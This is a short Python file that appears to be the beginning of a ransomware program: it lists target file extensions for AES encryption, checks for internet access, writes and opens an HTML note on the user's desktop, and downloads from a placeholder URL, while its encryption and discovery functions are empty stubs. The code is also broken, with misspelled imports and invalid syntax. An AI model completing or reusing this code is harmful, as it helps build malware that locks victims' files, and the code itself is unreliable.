#!/usr/bin/env python
#_*_ coding: utf8 _*_

import sys
import os
import wget
import socket
import haslib
import random
from Crypto.Cipher import AES
from Crypto.Util import Coanter
import webbrowser

file_list = []
file_list_encrypt = []
extensions = [".mp3",".txt", ".mp4", ".ani", ".jpg", ".png ", ".zip", ".rar", ".pdf", ".docx", ".wmv", ".ts"]

nota = """
 <html>
 	<body>
 		Hola
 	</body>
 </html>
"""


def check_internet():
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	try:
		s.connect(("socket.io",80))
		return true
	except:
		return false

def get_desktop():
	desktop = os.path.join(os.path.join(os.environ["HOME"]),"Escritorio")
	if os.path.exists(desktop):
		if os.access(desktop, os.W_OK):
			note = open(desktop="/hello.html","w+")
			note.write(nota)
			note.close()
			if os.path.exists(desktop="/hello.html"):
				webbrowser.open(desktop="/hello.html")
			else:
				pass

	f = wget.download("url")

def hash():
	pass

def discovery():
	pass

def decrypt_and_encrypt(archivo, crypto, block_size=16):
	pass

def main():
	pass

if __name__ == "__main__":
	main()















